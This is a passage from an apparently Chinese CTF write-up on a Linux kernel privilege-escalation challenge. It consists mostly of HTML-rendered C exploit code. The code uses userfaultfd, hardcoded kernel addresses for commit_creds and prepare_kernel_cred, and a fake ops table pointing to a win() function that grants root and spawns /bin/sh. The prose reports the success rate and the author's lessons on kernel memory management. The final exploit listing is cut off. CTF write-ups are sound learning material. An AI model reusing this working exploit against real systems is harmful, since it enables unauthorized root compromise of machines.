class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mmap_page != fake_ops_page) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;mmap error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// INFO: Step 0x06: close pipes</span></span><br><span class="line">step(<span class="string">&quot;close pipes&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ffffffff812c8d40 T commit_creds</span></span><br><span class="line"><span class="comment">// ffffffff812c8fd0 T prepare_kernel_cred</span></span><br><span class="line">commit_creds = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8d40</span>);</span><br><span class="line">prepare_kernel_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff812c8fd0</span>);</span><br><span class="line">init_cred = (<span class="type">void</span> *)calc(<span class="number">0xffffffff82a54120</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> win_addr = (<span class="type">uint64_t</span>)win;</span><br><span class="line">info(<span class="string">&quot;win address: %#lx\n&quot;</span>, win_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; ++i) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(fake_ops + i * <span class="number">8</span>, &amp;win_addr, <span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">  check(close(pipe_fd[i][<span class="number">0</span>]));</span><br><span class="line">  check(close(pipe_fd[i][<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell();</span><br></pre></td></tr></table></figure>

<h3 id="成功get-root"><a href="#成功get-root" class="headerlink" title="成功get root"></a>成功get root</h3><blockquote>
<p>叠了这么多随机因素，最终的成功率确实大打折扣，试了一下大概不到1&#x2F;40的样子</p>
</blockquote>
<p><img src="/images/ACTF-arandom/root.jpg" alt="get root :)"></p>
<p><del>再贴个刷出来的极低概率情况</del></p>
<p><img src="/images/ACTF-arandom/random.jpg" alt="???"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次复现给我阅读了大量源码（太痛苦了），但总算对Kernel内存管理机制入门了，之前各种疑惑点都得到了合理的解释，感觉通透了很多</p>
<blockquote>
<p><del>终于悟了</del></p>
</blockquote>
<h2 id="最终Exp（部分）"><a href="#最终Exp（部分）" class="headerlink" title="最终Exp（部分）"></a>最终Exp（部分）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./klog.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span> <span class="comment">// 添加 if_nametoindex 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC 0x200005401</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_hex</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> hex, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> i, cnt;</span><br><span class="line">  <span class="type">size_t</span> res = len % <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">size_t</span> times = len / <span class="number">0x10</span> + (res ? <span class="number">0x1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __len = (len &amp; (~<span class="number">0xf</span>)) + (res ? <span class="number">0x10</span> : <span class="number">0</span>);</span><br><span class="line">  <span class="type">char</span> *str = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="type">char</span> *__hex = (<span class="type">char</span> *)<span class="built_in">malloc</span>(__len);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, __len);</span><br><span class="line">  <span class="built_in">memcpy</span>(str, hex, len);</span><br><span class="line">  <span class="built_in">memcpy</span>(__hex, str, __len);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> l = <span class="number">0</span>; l &lt; __len; ++l) &#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= len || hex[l] &lt; <span class="string">&#x27; &#x27;</span> || hex[l] &gt;= <span class="number">0x7f</span>) &#123;</span><br><span class="line">      str[l] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> str1[<span class="number">0x9</span>], str2[<span class="number">0x9</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>, cnt = <span class="number">0</span>; i &lt; times; ++i) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(str1, str + cnt * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(str2, str + (cnt + <span class="number">1</span>) * <span class="number">0x8</span>, <span class="number">0x8</span>);</span><br><span class="line">    info(<span class="string">&quot;0x%04lx:  0x%016lx  0x%016lx    %s %s\n&quot;</span>, i * <span class="number">0x10</span>,</span><br><span class="line">         ((<span class="type">uint64_t</span> *)__hex)[cnt], ((<span class="type">uint64_t</span> *)__hex)[cnt + <span class="number">1</span>], str1, str2);</span><br><span class="line">    cnt += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(str);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *)KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81116130</span>;</span><br><span class="line"><span class="type">void</span> (*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *)<span class="number">0xffffffff81115e60</span>;</span><br><span class="line"><span class="type">void</span> *init_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cat /proc/kallsyms | grep &quot;prepare_kernel_cred&quot;</span></span><br><span class="line"><span class="comment">// sudo cat /proc/buddyinfo</span></span><br><span class="line"><span class="comment">// sudo cat /proc/pagetypeinfo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @fd openthe device;</span></span><br><span class="line"><span class="comment"> * @fd_tty openthe ptmx;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd, fd_tty;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">uint64_t</span> kernel_base, canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="comment">// uint64_t heap_address = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> addr - <span class="number">0xffffffff81000000</span> + kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                          <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *)uffd);</span><br><span class="line">  <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; commit_creds(init_cred); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[===================&quot;</span> GREEN <span class="string">&quot;SUCCESS&quot;</span> END</span><br><span class="line">            <span class="string">&quot;===================]\n&quot;</span>);</span><br><span class="line">    success(<span class="string">&quot;[=============================================]\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;*** root failed ***&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data for copy</span></span><br><span class="line"><span class="type">uint64_t</span> page[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span 